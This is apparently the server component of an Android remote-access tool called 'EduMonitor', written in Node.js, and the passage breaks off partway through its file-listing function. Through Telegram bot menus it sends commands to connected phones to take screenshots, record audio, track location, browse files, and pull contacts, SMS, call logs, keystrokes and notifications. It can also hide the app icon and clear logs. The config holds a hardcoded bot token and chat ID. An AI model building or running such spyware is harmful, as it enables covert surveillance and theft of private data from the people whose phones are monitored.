const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const schedule = require('node-schedule');
const sharp = require('sharp');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const compression = require('compression');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

// ============================================
// EXPRESS SETUP
// ============================================
const app = express();
const server = http.createServer(app);

// Trust proxy (for Render.com)
app.set('trust proxy', 1);

// ============================================
// CONFIGURATION
// ============================================
const config = {
    telegram: {
        token: process.env.TELEGRAM_BOT_TOKEN || '8655508141:AAH7ziEjGbwnAKur944BomeVvQ6nrt7jzqw',
        chatId: process.env.TELEGRAM_CHAT_ID || '5326373447'
    },
    server: {
        port: process.env.PORT || 8999,
        host: process.env.HOST || '0.0.0.0'
    },
    security: {
        encryptionKey: process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
        rateLimit: 100
    },
    storage: {
        maxFileSize: 100 * 1024 * 1024, // 100MB
        retentionDays: 7
    }
};

// ============================================
// WEBSOCKET SERVER
// ============================================
const wss = new WebSocket.Server({ 
    server, 
    path: '/ws',
    clientTracking: true
});

// ============================================
// DATABASE SETUP
// ============================================
const db = new sqlite3.Database('./edumonitor.db');

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS devices (
        id TEXT PRIMARY KEY,
        name TEXT,
        model TEXT,
        android_version TEXT,
        manufacturer TEXT,
        chat_id TEXT,
        registered_at INTEGER,
        last_seen INTEGER,
        battery_level INTEGER,
        is_active INTEGER DEFAULT 1,
        encryption_key TEXT,
        features TEXT
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        device_id TEXT,
        command TEXT,
        parameters TEXT,
        status TEXT,
        created_at INTEGER,
        executed_at INTEGER,
        result TEXT,
        priority INTEGER DEFAULT 0
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        latitude REAL,
        longitude REAL,
        accuracy REAL,
        altitude REAL,
        speed REAL,
        provider TEXT,
        timestamp INTEGER
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS media (
        id TEXT PRIMARY KEY,
        device_id TEXT,
        type TEXT,
        file_path TEXT,
        thumbnail_path TEXT,
        size INTEGER,
        timestamp INTEGER,
        metadata TEXT,
        uploaded INTEGER DEFAULT 0
    )`);
});

// ============================================
// SECURITY MIDDLEWARE
// ============================================
app.use(helmet());
app.use(compression());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: config.security.rateLimit,
    message: 'Too many requests from this IP'
});
app.use('/api/', limiter);

// ============================================
// ENCRYPTION UTILITIES
// ============================================
const encryption = {
    encrypt(text, key = config.security.encryptionKey) {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'hex'), iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag();
        return { iv: iv.toString('hex'), encrypted, authTag: authTag.toString('hex') };
    },

    decrypt(encryptedData, key = config.security.encryptionKey) {
        const decipher = crypto.createDecipheriv(
            'aes-256-gcm',
            Buffer.from(key, 'hex'),
            Buffer.from(encryptedData.iv, 'hex')
        );
        decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
        let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    },

    generateDeviceKey() {
        return crypto.randomBytes(32).toString('hex');
    }
};

// ============================================
// DEVICE MANAGER
// ============================================
class DeviceManager {
    constructor() {
        this.devices = new Map();
        this.wsConnections = new Map();
        this.eventHandlers = new Map();
        this.commandCallbacks = new Map(); // Store callbacks for command responses
    }

    registerDevice(deviceId, ws, deviceInfo) {
        const deviceKey = encryption.generateDeviceKey();
        
        const device = {
            id: deviceId,
            ws,
            info: deviceInfo,
            registeredAt: Date.now(),
            lastSeen: Date.now(),
            key: deviceKey,
            features: deviceInfo.features || [],
            batteryLevel: deviceInfo.battery,
            pendingCommands: [],
            lastLocation: null
        };

        this.devices.set(deviceId, device);
        this.wsConnections.set(ws, deviceId);

        db.run(`INSERT OR REPLACE INTO devices 
            (id, model, android_version, manufacturer, chat_id, registered_at, last_seen, battery_level, encryption_key, features) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [
                deviceId,
                deviceInfo.model,
                deviceInfo.androidVersion,
                deviceInfo.manufacturer,
                deviceInfo.chatId,
                Date.now(),
                Date.now(),
                deviceInfo.battery,
                deviceKey,
                JSON.stringify(deviceInfo.features || [])
            ]
        );

        this.emit('device_connected', device);
        return device;
    }

    updateDevice(deviceId, data) {
        const device = this.devices.get(deviceId);
        if (device) {
            Object.assign(device, data);
            device.lastSeen = Date.now();
            
            if (data.batteryLevel) {
                db.run(`UPDATE devices SET last_seen = ?, battery_level = ? WHERE id = ?`,
                    [Date.now(), data.batteryLevel, deviceId]);
            } else {
                db.run(`UPDATE devices SET last_seen = ? WHERE id = ?`, [Date.now(), deviceId]);
            }
        }
    }

    sendCommand(deviceId, command, parameters = {}, callback = null) {
        const device = this.devices.get(deviceId);
        if (!device) return { success: false, error: 'Device not found' };

        const commandId = uuidv4();
        const cmd = {
            id: commandId,
            command,
            parameters,
            timestamp: Date.now()
        };

        // Store callback if provided
        if (callback) {
            this.commandCallbacks.set(commandId, callback);
            // Auto-remove callback after 60 seconds
            setTimeout(() => {
                this.commandCallbacks.delete(commandId);
            }, 60000);
        }

        try {
            if (device.ws && device.ws.readyState === WebSocket.OPEN) {
                device.ws.send(JSON.stringify({
                    type: 'command',
                    id: commandId,
                    data: cmd
                }));
                
                db.run(`INSERT INTO commands (id, device_id, command, parameters, status, created_at)
                    VALUES (?, ?, ?, ?, 'sent', ?)`,
                    [commandId, deviceId, command, JSON.stringify(parameters), Date.now()]
                );
                
                return { success: true, commandId };
            } else {
                device.pendingCommands.push(cmd);
                return { success: true, commandId, queued: true };
            }
        } catch (error) {
            console.error(`Error sending command to ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    broadcastToDevices(message) {
        this.devices.forEach((device) => {
            if (device.ws && device.ws.readyState === WebSocket.OPEN) {
                device.ws.send(JSON.stringify(message));
            }
        });
    }

    on(event, handler) {
        if (!this.eventHandlers.has(event)) {
            this.eventHandlers.set(event, []);
        }
        this.eventHandlers.get(event).push(handler);
    }

    emit(event, data) {
        const handlers = this.eventHandlers.get(event) || [];
        handlers.forEach(handler => handler(data));
    }

    disconnectDevice(deviceId) {
        const device = this.devices.get(deviceId);
        if (device) {
            if (device.ws) {
                this.wsConnections.delete(device.ws);
            }
            this.devices.delete(deviceId);
            
            db.run(`UPDATE devices SET is_active = 0 WHERE id = ?`, [deviceId]);
            this.emit('device_disconnected', device);
        }
    }
}

const deviceManager = new DeviceManager();

// ============================================
// TELEGRAM BOT INTEGRATION
// ============================================
const TELEGRAM_API = `https://api.telegram.org/bot${config.telegram.token}`;

async function sendTelegramMessage(chatId, text, options = {}) {
    try {
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            ...options
        });
        return response.data;
    } catch (error) {
        console.error('Telegram send error:', error.response?.data || error.message);
        return null;
    }
}

async function sendTelegramLocation(chatId, lat, lon) {
    try {
        await axios.post(`${TELEGRAM_API}/sendLocation`, {
            chat_id: chatId,
            latitude: lat,
            longitude: lon
        });
    } catch (error) {
        console.error('Location send error:', error);
    }
}

async function sendTelegramPhoto(chatId, photoPath, caption = '') {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', fs.createReadStream(photoPath));
        formData.append('caption', caption);

        await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
            headers: formData.getHeaders()
        });
    } catch (error) {
        console.error('Photo send error:', error);
    }
}

async function sendTelegramDocument(chatId, filePath, filename, caption = '') {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);

        await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: formData.getHeaders()
        });
    } catch (error) {
        console.error('Document send error:', error);
    }
}

async function editMessageText(chatId, messageId, text, keyboard = null) {
    try {
        const payload = {
            chat_id: chatId,
            message_id: messageId,
            text: text,
            parse_mode: 'HTML'
        };
        if (keyboard) {
            payload.reply_markup = { inline_keyboard: keyboard };
        }
        await axios.post(`${TELEGRAM_API}/editMessageText`, payload);
    } catch (error) {
        console.error('Edit message error:', error);
    }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text
        });
    } catch (error) {
        console.error('Answer callback error:', error);
    }
}

// ============================================
// PROFESSIONAL INLINE KEYBOARDS
// ============================================

const MainMenuKeyboard = [
    [{ text: '📱 DEVICES', callback_data: 'menu_devices' }],
    [{ text: '📸 SCREENSHOT', callback_data: 'menu_screenshot' }, { text: '🎤 RECORDING', callback_data: 'menu_recording' }],
    [{ text: '📍 LOCATION', callback_data: 'menu_location' }, { text: '📁 FILES', callback_data: 'menu_files' }],
    [{ text: '📊 DATA EXTRACTION', callback_data: 'menu_data' }],
    [{ text: '⚙️ SETTINGS', callback_data: 'menu_settings' }, { text: '❓ HELP', callback_data: 'menu_help' }]
];

const DevicesMenuKeyboard = (devices) => {
    const keyboard = [];
    devices.forEach(device => {
        const batteryEmoji = getBatteryEmoji(device.batteryLevel);
        const shortId = device.id.substring(0, 6);
        keyboard.push([{ 
            text: `${batteryEmoji} ${device.info.model} (${shortId})`, 
            callback_data: `device_${device.id}` 
        }]);
    });
    keyboard.push([{ text: '🔙 BACK TO MAIN', callback_data: 'menu_main' }]);
    return keyboard;
};

const DeviceActionKeyboard = (deviceId) => [
    [{ text: 'ℹ️ INFO', callback_data: `info_${deviceId}` }, { text: '📸 SCREENSHOT', callback_data: `screenshot_${deviceId}` }],
    [{ text: '🎤 RECORD (30s)', callback_data: `record_30_${deviceId}` }, { text: '🎤 RECORD (60s)', callback_data: `record_60_${deviceId}` }],
    [{ text: '📍 LOCATION', callback_data: `location_${deviceId}` }, { text: '📁 LIST FILES', callback_data: `files_${deviceId}` }],
    [{ text: '📇 CONTACTS', callback_data: `contacts_${deviceId}` }, { text: '💬 SMS', callback_data: `sms_${deviceId}` }],
    [{ text: '📞 CALL LOGS', callback_data: `calllogs_${deviceId}` }, { text: '📱 APPS', callback_data: `apps_${deviceId}` }],
    [{ text: '🔋 BATTERY', callback_data: `battery_${deviceId}` }, { text: '📡 NETWORK', callback_data: `network_${deviceId}` }],
    [{ text: '💾 STORAGE', callback_data: `storage_${deviceId}` }, { text: '🔄 REBOOT', callback_data: `reboot_${deviceId}` }],
    [{ text: '👻 HIDE ICON', callback_data: `hide_${deviceId}` }, { text: '👁️ SHOW ICON', callback_data: `show_${deviceId}` }],
    [{ text: '🗑️ CLEAR LOGS', callback_data: `clear_${deviceId}` }],
    [{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]
];

const DataExtractionKeyboard = (deviceId) => [
    [{ text: '📇 CONTACTS (TXT)', callback_data: `contacts_txt_${deviceId}` }, { text: '📇 CONTACTS (HTML)', callback_data: `contacts_html_${deviceId}` }],
    [{ text: '💬 SMS (TXT)', callback_data: `sms_txt_${deviceId}` }, { text: '💬 SMS (HTML)', callback_data: `sms_html_${deviceId}` }],
    [{ text: '📞 CALL LOGS (TXT)', callback_data: `calllogs_txt_${deviceId}` }, { text: '📞 CALL LOGS (HTML)', callback_data: `calllogs_html_${deviceId}` }],
    [{ text: '📱 APPS (TXT)', callback_data: `apps_txt_${deviceId}` }, { text: '📱 APPS (HTML)', callback_data: `apps_html_${deviceId}` }],
    [{ text: '⌨️ KEYSTROKES (TXT)', callback_data: `keystrokes_txt_${deviceId}` }, { text: '⌨️ KEYSTROKES (HTML)', callback_data: `keystrokes_html_${deviceId}` }],
    [{ text: '🔔 NOTIFICATIONS (TXT)', callback_data: `notifications_txt_${deviceId}` }, { text: '🔔 NOTIFICATIONS (HTML)', callback_data: `notifications_html_${deviceId}` }],
    [{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]
];

const SettingsMenuKeyboard = [
    [{ text: '🔔 NOTIFICATIONS', callback_data: 'settings_notifications' }],
    [{ text: '🎚️ AUTO SCREENSHOT', callback_data: 'settings_auto_screenshot' }],
    [{ text: '⏰ RECORDING SCHEDULE', callback_data: 'settings_recording_schedule' }],
    [{ text: '🔒 PRIVACY', callback_data: 'settings_privacy' }],
    [{ text: '🔙 BACK TO MAIN', callback_data: 'menu_main' }]
];

// ============================================
// WEBSOCKET CONNECTION HANDLING
// ============================================
wss.on('connection', (ws, req) => {
    const deviceId = req.headers['device-id'];
    const deviceInfo = JSON.parse(req.headers['device-info'] || '{}');

    if (!deviceId) {
        ws.close(1008, 'Device ID required');
        return;
    }

    // Register device
    const device = deviceManager.registerDevice(deviceId, ws, {
        ...deviceInfo,
        chatId: config.telegram.chatId
    });

    ws.send(JSON.stringify({
        type: 'registered',
        deviceId: device.id,
        timestamp: Date.now()
    }));

    // Send welcome notification to Telegram
    sendTelegramMessage(config.telegram.chatId, 
        `✅ *Device Connected*\nModel: ${device.info.model}\nAndroid: ${device.info.androidVersion}`);

    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            
            switch (message.type) {
                case 'pong':
                    deviceManager.updateDevice(deviceId, { lastSeen: Date.now() });
                    break;

                case 'response':
                    await handleDeviceResponse(deviceId, message);
                    break;

                case 'location':
                    await handleDeviceLocation(deviceId, message.data);
                    break;

                case 'battery':
                    deviceManager.updateDevice(deviceId, { batteryLevel: message.level });
                    break;
            }
        } catch (error) {
            console.error('Error processing message:', error);
        }
    });

    ws.on('close', () => {
        deviceManager.disconnectDevice(deviceId);
        sendTelegramMessage(config.telegram.chatId, 
            `❌ *Device Disconnected*\nModel: ${device.info.model}`);
    });

    ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
});

// ============================================
// RESPONSE HANDLERS
// ============================================
async function handleDeviceResponse(deviceId, message) {
    const { commandId, success, data, error } = message;
    
    // Update command status in database
    db.run(`UPDATE commands SET status = ?, result = ?, executed_at = ? WHERE id = ?`,
        [success ? 'completed' : 'failed', JSON.stringify(data || error), Date.now(), commandId]
    );

    // Check if there's a callback for this command
    const callback = deviceManager.commandCallbacks.get(commandId);
    if (callback) {
        callback(success, data, error);
        deviceManager.commandCallbacks.delete(commandId);
        return;
    }

    // Handle specific response types
    if (data && data.type === 'location') {
        await handleLocationResponse(deviceId, data);
    } else if (data && data.filePath) {
        await handleFileResponse(deviceId, data);
    }
}

async function handleDeviceLocation(deviceId, locationData) {
    const device = deviceManager.devices.get(deviceId);
    if (!device) return;

    device.lastLocation = locationData;

    db.run(`INSERT INTO locations 
        (device_id, latitude, longitude, accuracy, provider, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)`,
        [
            deviceId,
            locationData.lat,
            locationData.lon,
            locationData.accuracy,
            locationData.provider,
            locationData.timestamp || Date.now()
        ]
    );

    // Send to Telegram as live location
    await sendTelegramLocation(config.telegram.chatId, locationData.lat, locationData.lon);
}

async function handleLocationResponse(deviceId, data) {
    const device = deviceManager.devices.get(deviceId);
    if (!device) return;

    const mapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
    const message = 
        `📍 *Location from ${device.info.model}*\n\n` +
        `Lat: \`${data.lat}\`\n` +
        `Lon: \`${data.lon}\`\n` +
        `Accuracy: ±${data.accuracy}m\n` +
        `Provider: ${data.provider}\n\n` +
        `[View on Google Maps](${mapsUrl})`;

    await sendTelegramMessage(config.telegram.chatId, message);
}

async function handleFileResponse(deviceId, data) {
    const device = deviceManager.devices.get(deviceId);
    if (!device || !data.filePath) return;

    // File is already saved locally, send to Telegram
    if (fs.existsSync(data.filePath)) {
        const caption = `📎 File from ${device.info.model}\nSize: ${formatFileSize(data.size)}`;
        await sendTelegramDocument(config.telegram.chatId, data.filePath, path.basename(data.filePath), caption);
    }
}

// ============================================
// TELEGRAM WEBHOOK HANDLER
// ============================================
app.post('/webhook', async (req, res) => {
    res.sendStatus(200);

    const update = req.body;

    if (update.message) {
        await handleTelegramMessage(update.message);
    } else if (update.callback_query) {
        await handleTelegramCallback(update.callback_query);
    }
});

async function handleTelegramMessage(message) {
    const chatId = message.chat.id;
    const text = message.text;

    if (chatId.toString() !== config.telegram.chatId) {
        await sendTelegramMessage(chatId, '⛔ Unauthorized');
        return;
    }

    if (!text) return;

    if (text === '/start' || text === '/help' || text === '/menu') {
        await sendTelegramMessage(chatId, 
            '🤖 *EduMonitor Control Panel*\n\nSelect an option below:',
            { reply_markup: { inline_keyboard: MainMenuKeyboard } }
        );
    } else if (text === '/devices') {
        await showDevicesMenu(chatId, message.message_id);
    }
}

async function handleTelegramCallback(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;

    await answerCallbackQuery(callbackId);

    if (data === 'menu_main') {
        await editMessageText(chatId, messageId, 
            '🤖 *EduMonitor Control Panel*\n\nSelect an option below:',
            MainMenuKeyboard
        );
    }
    else if (data === 'menu_devices') {
        await showDevicesMenu(chatId, messageId);
    }
    else if (data === 'menu_screenshot') {
        await showScreenshotMenu(chatId, messageId);
    }
    else if (data === 'menu_recording') {
        await showRecordingMenu(chatId, messageId);
    }
    else if (data === 'menu_location') {
        await showLocationMenu(chatId, messageId);
    }
    else if (data === 'menu_files') {
        await showFilesMenu(chatId, messageId);
    }
    else if (data === 'menu_data') {
        await showDataExtractionMenu(chatId, messageId);
    }
    else if (data === 'menu_settings') {
        await editMessageText(chatId, messageId,
            '⚙️ *Settings Menu*\n\nConfigure your preferences:',
            SettingsMenuKeyboard
        );
    }
    else if (data === 'menu_help') {
        await showHelpMenu(chatId, messageId);
    }
    else if (data.startsWith('device_')) {
        const deviceId = data.substring(7);
        await showDeviceDetails(chatId, messageId, deviceId);
    }
    else if (data.startsWith('screenshot_')) {
        const deviceId = data.substring(11);
        await takeScreenshot(chatId, messageId, deviceId);
    }
    else if (data.startsWith('record_')) {
        const parts = data.split('_');
        const seconds = parseInt(parts[1]);
        const deviceId = parts.slice(2).join('_');
        await startRecording(chatId, messageId, deviceId, seconds);
    }
    else if (data.startsWith('location_')) {
        const deviceId = data.substring(9);
        await getLocation(chatId, messageId, deviceId);
    }
    else if (data.startsWith('files_')) {
        const deviceId = data.substring(6);
        await listFiles(chatId, messageId, deviceId);
    }
    else if (data.startsWith('contacts_')) {
        const parts = data.split('_');
        const format = parts[1]; // txt or html
        const deviceId = parts.slice(2).join('_');
        await getContacts(chatId, messageId, deviceId, format);
    }
    else if (data.startsWith('sms_')) {
        const parts = data.split('_');
        const format = parts[1]; // txt or html
        const deviceId = parts.slice(2).join('_');
        await getSMS(chatId, messageId, deviceId, format);
    }
    else if (data.startsWith('calllogs_')) {
        const parts = data.split('_');
        const format = parts[1]; // txt or html
        const deviceId = parts.slice(2).join('_');
        await getCallLogs(chatId, messageId, deviceId, format);
    }
    else if (data.startsWith('apps_')) {
        const parts = data.split('_');
        const format = parts[1]; // txt or html
        const deviceId = parts.slice(2).join('_');
        await getApps(chatId, messageId, deviceId, format);
    }
    else if (data.startsWith('keystrokes_')) {
        const parts = data.split('_');
        const format = parts[1]; // txt or html
        const deviceId = parts.slice(2).join('_');
        await getKeystrokes(chatId, messageId, deviceId, format);
    }
    else if (data.startsWith('notifications_')) {
        const parts = data.split('_');
        const format = parts[1]; // txt or html
        const deviceId = parts.slice(2).join('_');
        await getNotifications(chatId, messageId, deviceId, format);
    }
    else if (data.startsWith('battery_')) {
        const deviceId = data.substring(8);
        await getBatteryStatus(chatId, messageId, deviceId);
    }
    else if (data.startsWith('network_')) {
        const deviceId = data.substring(8);
        await getNetworkInfo(chatId, messageId, deviceId);
    }
    else if (data.startsWith('storage_')) {
        const deviceId = data.substring(8);
        await getStorageInfo(chatId, messageId, deviceId);
    }
    else if (data.startsWith('reboot_')) {
        const deviceId = data.substring(7);
        await rebootDevice(chatId, messageId, deviceId);
    }
    else if (data.startsWith('hide_')) {
        const deviceId = data.substring(5);
        await hideIcon(chatId, messageId, deviceId);
    }
    else if (data.startsWith('show_')) {
        const deviceId = data.substring(5);
        await showIcon(chatId, messageId, deviceId);
    }
    else if (data.startsWith('clear_')) {
        const deviceId = data.substring(6);
        await clearLogs(chatId, messageId, deviceId);
    }
    else if (data.startsWith('info_')) {
        const deviceId = data.substring(5);
        await getDeviceInfo(chatId, messageId, deviceId);
    }
}

// ============================================
// MENU DISPLAY FUNCTIONS
// ============================================

async function showDevicesMenu(chatId, messageId) {
    const devices = Array.from(deviceManager.devices.values());
    
    if (devices.length === 0) {
        await editMessageText(chatId, messageId,
            '📭 *No Devices Connected*\n\nNo devices are currently connected.',
            [[{ text: '🔄 REFRESH', callback_data: 'menu_devices' }, { text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
        );
        return;
    }

    const keyboard = DevicesMenuKeyboard(devices);
    await editMessageText(chatId, messageId,
        `📱 *Connected Devices (${devices.length})*\n\nSelect a device to control:`,
        keyboard
    );
}

async function showDeviceDetails(chatId, messageId, deviceId) {
    const device = deviceManager.devices.get(deviceId);
    if (!device) {
        await editMessageText(chatId, messageId,
            '❌ *Device Not Found*\n\nThe device may have disconnected.',
            [[{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]]
        );
        return;
    }

    const lastSeen = new Date(device.lastSeen).toLocaleString();
    const uptime = formatUptime(device.registeredAt);
    const batteryEmoji = getBatteryEmoji(device.batteryLevel);

    const message = 
        `📱 *Device Details*\n\n` +
        `*Model:* ${device.info.model}\n` +
        `*Android:* ${device.info.androidVersion}\n` +
        `*Manufacturer:* ${device.info.manufacturer}\n` +
        `*Battery:* ${batteryEmoji} ${device.batteryLevel || '?'}%\n` +
        `*Last Seen:* ${lastSeen}\n` +
        `*Uptime:* ${uptime}\n` +
        `*Features:* ${device.features.join(', ') || 'Standard'}\n\n` +
        `*Select an action:*`;

    await editMessageText(chatId, messageId, message, DeviceActionKeyboard(deviceId));
}

async function showScreenshotMenu(chatId, messageId) {
    const devices = Array.from(deviceManager.devices.values());
    
    const keyboard = [];
    devices.forEach(device => {
        keyboard.push([{ 
            text: `📸 ${device.info.model}`, 
            callback_data: `screenshot_${device.id}` 
        }]);
    });
    keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

    await editMessageText(chatId, messageId,
        '📸 *Screenshot Menu*\n\nSelect a device to capture screen:',
        keyboard
    );
}

async function showRecordingMenu(chatId, messageId) {
    const devices = Array.from(deviceManager.devices.values());
    
    const keyboard = [];
    devices.forEach(device => {
        keyboard.push([
            { text: `🎤 ${device.info.model} (30s)`, callback_data: `record_30_${device.id}` },
            { text: `🎤 (60s)`, callback_data: `record_60_${device.id}` }
        ]);
    });
    keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

    await editMessageText(chatId, messageId,
        '🎤 *Recording Menu*\n\nSelect a device and duration:',
        keyboard
    );
}

async function showLocationMenu(chatId, messageId) {
    const devices = Array.from(deviceManager.devices.values());
    
    const keyboard = [];
    devices.forEach(device => {
        keyboard.push([{ 
            text: `📍 ${device.info.model}`, 
            callback_data: `location_${device.id}` 
        }]);
    });
    keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

    await editMessageText(chatId, messageId,
        '📍 *Location Menu*\n\nSelect a device to get current location:',
        keyboard
    );
}

async function showFilesMenu(chatId, messageId) {
    const devices = Array.from(deviceManager.devices.values());
    
    const keyboard = [];
    devices.forEach(device => {
        keyboard.push([{ 
            text: `📁 ${device.info.model}`, 
            callback_data: `files_${device.id}` 
        }]);
    });
    keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

    await editMessageText(chatId, messageId,
        '📁 *File Explorer*\n\nSelect a device to browse files:',
        keyboard
    );
}

async function showDataExtractionMenu(chatId, messageId) {
    const devices = Array.from(deviceManager.devices.values());
    
    if (devices.length === 0) {
        await editMessageText(chatId, messageId,
            '📭 *No Devices Connected*',
            [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
        );
        return;
    }

    // If only one device, show its data extraction menu directly
    if (devices.length === 1) {
        const device = devices[0];
        await editMessageText(chatId, messageId,
            `📊 *Data Extraction - ${device.info.model}*\n\nSelect data type to extract:`,
            DataExtractionKeyboard(device.id)
        );
        return;
    }

    // Multiple devices - show device selection first
    const keyboard = [];
    devices.forEach(device => {
        keyboard.push([{ 
            text: `📊 ${device.info.model}`, 
            callback_data: `data_device_${device.id}` 
        }]);
    });
    keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

    await editMessageText(chatId, messageId,
        '📊 *Data Extraction*\n\nSelect a device:',
        keyboard
    );
}

async function showHelpMenu(chatId, messageId) {
    const helpText = 
        '❓ *EduMonitor Help*\n\n' +
        '*Available Commands:*\n' +
        '• /start - Show main menu\n' +
        '• /devices - List all devices\n' +
        '• /help - Show this help\n\n' +
        '*Features:*\n' +
        '• 📸 Screenshot capture\n' +
        '• 🎤 Audio recording\n' +
        '• 📍 GPS location tracking\n' +
        '• 📁 File explorer\n' +
        '• 📊 Data extraction (contacts, SMS, etc.)\n' +
        '• 🔋 Battery monitoring\n' +
        '• 📡 Network information\n' +
        '• 💾 Storage information\n\n' +
        '*Advanced:*\n' +
        '• 👻 Hide/show app icon\n' +
        '• 🔄 Reboot services\n' +
        '• 🗑️ Clear logs';

    await editMessageText(chatId, messageId, helpText, [
        [{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]
    ]);
}

// ============================================
// COMMAND EXECUTION FUNCTIONS
// ============================================

async function takeScreenshot(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `📸 *Taking Screenshot*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, 'take_screenshot', {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `✅ *Screenshot captured successfully!*\n\nProcessing and uploading...`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Screenshot Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });

    if (!result.success) {
        await editMessageText(chatId, messageId,
            `❌ *Failed to send command*\n\nDevice may be offline.`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
        );
    }
}

async function startRecording(chatId, messageId, deviceId, seconds) {
    await editMessageText(chatId, messageId,
        `🎤 *Starting Recording*\n\nDuration: ${seconds}s\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, 'record_audio', { seconds }, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `✅ *Recording completed!*\n\nProcessing and uploading...`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Recording Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });

    if (!result.success) {
        await editMessageText(chatId, messageId,
            `❌ *Failed to send command*\n\nDevice may be offline.`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
        );
    }
}

async function getLocation(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `📍 *Getting Location*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, 'get_location', {}, (success, data, error) => {
        if (success) {
            // Location will be sent automatically via handleLocationResponse
            editMessageText(chatId, messageId,
                `📍 *Location request sent*\n\nWaiting for response...`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Location Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });

    if (!result.success) {
        await editMessageText(chatId, messageId,
            `❌ *Failed to send command*\n\nDevice may be offline.`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
        );
    }
}

async function listFiles(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `📁 *Listing Files*\n\nEnter path (e.g., /sdcard):`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );
    
    // This would need a state machine for path input
    // For now, default to /sdcard
    const defaultPath = '/sdcard';
    
    const result = deviceManager.sendCommand(deviceId, 'list_files', { path: defaultPath }, (success, data, error) => {
        if (success && data.files) {
            let fileList = `📁 *Files in ${data.path || defaultPath}*\n\n`;
            data.files.slice(0, 20).forEach(f => {
                const icon = f.isDirectory ? '📁' : '📄';
                const size = f.size ? ` (${formatFileSize(f.size)})` : '';
                fileList += `${icon} ${f.name}${size}\n`;
            });
            if (data.files.length > 20) {
                fileList += `\n... and ${data.files.length - 20} more`;
            }
            editMessageText(chatId, messageId, fileList,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
